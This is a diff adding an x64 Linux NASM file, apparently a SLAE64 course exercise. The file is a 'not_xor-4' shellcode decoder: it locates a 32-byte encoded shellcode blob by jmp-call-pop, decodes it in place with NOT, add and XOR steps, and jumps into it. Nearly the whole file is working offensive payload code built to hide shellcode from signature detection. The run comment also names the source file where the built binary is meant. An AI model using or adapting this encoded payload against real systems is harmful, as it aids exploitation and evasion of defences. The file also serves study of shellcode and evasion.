@@ -1,0 +1,35 @@
+;Title:            not_xor-4 scheme
+;Author:           David Velázquez a.k.a d4sh&r
+;Contact:          https://mx.linkedin.com/in/d4v1dvc
+;Description:      x64 Linux decoder not_xor-4 scheme
+;Tested On:        Linux kali64 3.18.0-kali3-amd64 x86_64 GNU/Linux 
+
+;Compile & Run:    nasm -f elf64 -o decoder.o decoder.nasm
+;                  ld -o decoder decoder.o
+;                  ./decoder.nasm
+;SLAE64-1379
+
+global _start 
+
+section .text
+
+_start:
+
+	jmp find_address
+
+decoder:
+	pop rdi
+	xor rcx, rcx
+	add cl, 32
+
+decode:
+    not byte [rdi]
+    add byte [rdi], 4
+	xor byte [rdi], 0xda    
+	inc rdi
+	loop decode
+	jmp short encoded_shellcode
+ 
+find_address:
+	call decoder
+	encoded_shellcode: db 0x71,0x18,0xe9,0x79,0x71,0xa2,0x0e,0x4b,0x50,0x4f,0x0e,0x0e,0x5a,0x51,0x7a,0x71,0xb0,0xc6,0x79,0x71,0xb0,0xcb,0x76,0x71,0xb0,0xc7,0x71,0xaa,0xe9,0x22,0x2e,0x24
